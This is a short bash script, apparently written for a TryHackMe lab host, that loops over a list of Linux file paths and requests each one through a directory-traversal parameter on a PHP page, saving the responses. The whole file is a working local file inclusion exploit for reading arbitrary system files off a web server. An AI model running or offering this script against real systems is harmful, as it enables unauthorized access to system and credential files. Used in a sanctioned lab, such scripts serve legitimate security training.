#!/bin/bash

while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s\n' "$p"
  curl 'http://dev.team.thm/script.php?page=../../../../../../../..'"$p" > LFI_v2_results.txt
done < linux-paths.txt

